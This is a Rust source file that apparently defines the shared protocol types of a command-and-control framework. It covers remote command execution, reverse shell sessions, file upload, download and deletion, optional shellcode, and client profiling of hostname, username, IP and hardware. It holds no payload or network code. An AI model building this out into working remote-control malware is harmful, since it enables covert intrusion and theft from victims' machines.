use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::time::SystemTime;
use uuid::Uuid;

/// C2 framework message structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Message {
    /// Unique identifier for the message
    pub id: String,
    /// Timestamp of when the message was created
    pub timestamp: DateTime<Utc>,
    /// Type of the message
    pub message_type: MessageType,
    /// Payload of the message, can be any binary data
    pub payload: Vec<u8>,
}

/// Message types for C2 framework
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum MessageType {
    /// Client registration
    ClientRegister,
    /// Client heartbeat
    Heartbeat,
    /// Execute command
    ExecuteCommand,
    /// Command result
    CommandResult,
    /// Reverse shell request
    ReverseShell,
    /// Shell data
    ShellData,
    /// List directory contents
    ListDir,
    /// Delete file or directory
    DeletePath,
    /// Upload file initialization
    UploadFileInit,
    /// Upload file chunk
    UploadFileChunk,
    /// Download file initialization
    DownloadFileInit,
    /// Download file chunk
    DownloadFileChunk,
    /// Error message
    Error,
    /// Response to a file operation
    FileOperationResponse,
}

/// Client information structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientInfo {
    /// Unique identifier for the client
    pub id: String,
    /// Hostname of the client
    pub hostname: String,
    /// Username of the client
    pub username: String,
    /// Operating system of the client
    pub os: String,
    /// Architecture of the client
    pub arch: String,
    /// Local IP address of the client
    pub ip: String,
    /// Country information based on the IP address
    pub country_info: Option<String>,
    /// CPU brand of the client
    pub cpu_brand: String,
    /// CPU frequency in MHz
    pub cpu_frequency: u64,
    /// Number of CPU cores
    pub cpu_cores: usize,
    /// Total memory in GB
    pub memory: u64,
    /// Total disk space in GB
    pub total_disk_space: u64,
    /// Available disk space in GB
    pub available_disk_space: u64,
    /// Date and time when the client connected
    pub connected_at: DateTime<Utc>,
    /// Date and time when the client was last seen
    pub last_seen: DateTime<Utc>,
}

/// Command request and response structures
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandRequest {
    /// Unique identifier for the command request
    pub client_id: String,
    /// Command to be executed on the client
    pub command: String,
    /// Arguments for the command
    pub args: Vec<String>,
    /// Optional message ID for tracking
    pub message_id: Option<String>,
    /// Optional shellcode for execution
    pub shellcode: Option<String>,
}

/// Command response structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResponse {
    /// Unique identifier for the command response
    pub client_id: String,
    /// Command that was executed
    pub command: String,
    /// Standard output from the command execution
    pub stdout: String,
    /// Standard error output from the command execution
    pub stderr: String,
    /// Exit code of the command execution
    pub exit_code: i32,
    /// Timestamp of when the command was executed
    pub executed_at: DateTime<Utc>,
}

/// Encrypted command response structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedCommandResponse {
    /// Unique identifier for the command response
    pub client_id: String,
    /// Command that was executed
    pub encrypted_data: String,
    /// Standard output from the command execution
    pub executed_at: DateTime<Utc>,
}

// Manually implement Send and Sync for EncryptedCommandResponse
unsafe impl Send for EncryptedCommandResponse {}
unsafe impl Sync for EncryptedCommandResponse {}

/// Reverse shell session structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellSession {
    /// Unique identifier for the shell session
    pub client_id: String,
    /// Session ID for the shell
    pub session_id: String,
    /// Shell start time
    pub created_at: DateTime<Utc>,
    /// Shell is currently active or not
    pub is_active: bool,
}

/// Shell data structure for reverse shell communication
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellData {
    /// Unique identifier for the shell session
    pub session_id: String,
    /// Data sent through the shell
    pub data: Vec<u8>,
    /// Timestamp of when the data was sent
    pub timestamp: DateTime<Utc>,
}

/// File entry structure for listing directories
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileEntry {
    /// Name of the file or directory
    pub name: String,
    /// Full path of the file or directory
    pub path: PathBuf,
    /// Indicates if the entry is a directory
    pub is_dir: bool,
    /// Size of the file in bytes, if applicable
    pub size: Option<u64>,
    /// Last modified time of the file or directory
    pub modified: Option<SystemTime>,
    /// Permissions of the file or directory
    pub permissions: Option<String>,
    /// Owner of the file or directory
    pub owner: Option<String>,
    /// Group of the file or directory
    pub group: Option<String>,
}

/// Request to list directory contents on the client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListDirRequest {
    /// Path to the directory to list
    pub path: String,
    /// Whether to list files recursively
    pub recursive: bool,
}

/// Response for listing directory contents on the client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListDirResponse {
    /// List of file entries in the directory
    pub entries: Vec<FileEntry>,
    /// Indicates if the operation was successful
    pub success: bool,
    /// Message providing additional information
    pub message: String,
}

/// Request to delete a path on the client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeletePathRequest {
    pub path: String,
}

/// Response for deleting a path on the client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeletePathResponse {
    pub success: bool,
    pub message: String,
}

/// Request to download a file from the client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DownloadFileRequest {
    pub path: String,
}

/// Chunk of data for file download/upload
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunk {
    /// Unique identifier for the file being transferred
    pub file_id: String,
    /// Data chunk being transferred
    pub chunk: Vec<u8>,
    /// Indicates if this is the last chunk of the file
    pub is_last: bool,
    /// Size of the chunk
    pub offset: u64,
}

/// Request to upload a file to the client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UploadFileRequest {
    /// Path where the file should be uploaded
    pub path: String,
    /// Unique identifier for the file being uploaded
    pub file_id: String,
}

/// Request to get next chunk for download
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DownloadChunkRequest {
    pub file_id: String,
}

/// Unified file operation command
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum FileOperationCommand {
    ListDir(ListDirRequest),
    DeletePath(DeletePathRequest),
    DownloadInit(DownloadFileRequest),
    DownloadChunk(DownloadChunkRequest),
    UploadInit(UploadFileRequest),
    UploadChunk(FileChunk),
}

/// Implementation of methods for Message
impl Message {
    pub fn new(message_type: MessageType, payload: Vec<u8>) -> Self {
        Self {
            id: Uuid::new_v4().to_string(),
            timestamp: Utc::now(),
            message_type,
            payload,
        }
    }

    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string(self)
    }

    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }
}

impl std::fmt::Display for MessageType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{self:?}")
    }
}
